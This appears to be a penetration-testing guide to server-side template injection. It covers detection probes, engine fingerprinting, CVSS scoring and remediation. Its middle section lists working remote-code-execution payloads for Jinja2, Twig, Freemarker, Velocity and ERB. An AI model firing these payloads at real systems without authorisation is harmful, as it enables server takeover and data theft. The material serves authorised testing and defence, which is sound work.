# Server-Side Template Injection (SSTI) — Detection to RCE

*Keywords: SSTI, server side template injection, template injection, Jinja2, Twig, Freemarker, Velocity, ERB, Handlebars, Smarty, {{7*7}}, ${7*7}, #{7*7}, template engine RCE, sandbox escape, expression language injection, EL injection.*

## What SSTI is and where to find it

SSTI is user input concatenated into a server-side template *before* it is rendered, so the input is evaluated as template code — not just displayed. It differs from XSS: XSS runs in the browser, SSTI runs on the server and frequently reaches RCE. Look wherever the app renders user-controlled text through a template engine: customizable email/notification templates, name/greeting personalization ("Hello {{name}}"), rendered error pages that echo input, PDF/report generators, CMS "themes", markdown-with-variables, and any feature described as "supports variables/placeholders." An input reflected on the page is an XSS candidate; an input reflected *and* evaluated (math runs) is SSTI.

## SSTI detection — impact-limited fingerprinting

Probe with polyglot math so a single request reveals which family you hit: send `${{<%[%'"}}%\` (breaks something in most engines) then narrow with `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `{7*7}`. If `49` (not `7*7`) comes back, it's evaluated — SSTI confirmed. Fingerprint the engine to pick the exploit path: `{{7*'7'}}` → `7777777` = Jinja2/Twig (Python/PHP), `49` = Freemarker/Velocity (Java); `${7*7}` alone → Freemarker/JSP-EL; `#{7*7}` → Ruby ERB/Slim. **Prove impact without popping a full shell on production**: read a harmless server-side value (e.g. Jinja2 `{{config.items()}}` or a single env var) to demonstrate server-side evaluation. Escalating to command execution on an in-scope host is fine as a PoC, but run one benign command (`id` / `whoami`) and stop — no data destruction, no persistence.

## SSTI exploitation paths by engine

Once confirmed, RCE payloads (use the minimum to prove it): **Jinja2 (Python)** — `{{ cycler.__init__.__globals__.os.popen('id').read() }}` or the classic `{{ ''.__class__.__mro__[1].__subclasses__() }}` gadget hunt; newer sandboxes need `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`. **Twig (PHP)** — `{{ ['id']|filter('system') }}` or `{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}`. **Freemarker (Java)** — `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`. **Velocity** — `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`. **ERB (Ruby)** — `<%= system("id") %>`. If the engine is sandboxed, look for a sandbox-escape gadget (unblocked class/attribute) rather than forcing a blocked one. Keep the whole chain on the in-scope host and impact-limited.

## SSTI CVSS and remediation

SSTI reaching RCE on the server (unauthenticated): `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 Critical; authenticated-only or read-only server data disclosure without command exec: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5. Root cause: user input used as part of the template *string* rather than passed as sandboxed *data* to a precompiled template. Remediation: never build templates from user input — use a fixed template with user values bound as context variables only; if user-authored templates are a real requirement, use a logic-less engine (Mustache) or a hardened sandbox with an allowlist and no access to `os`/reflection; validate/escape, run the renderer with least privilege, and treat template features (`registerUndefinedFilterCallback`, `Execute`) as dangerous by default.
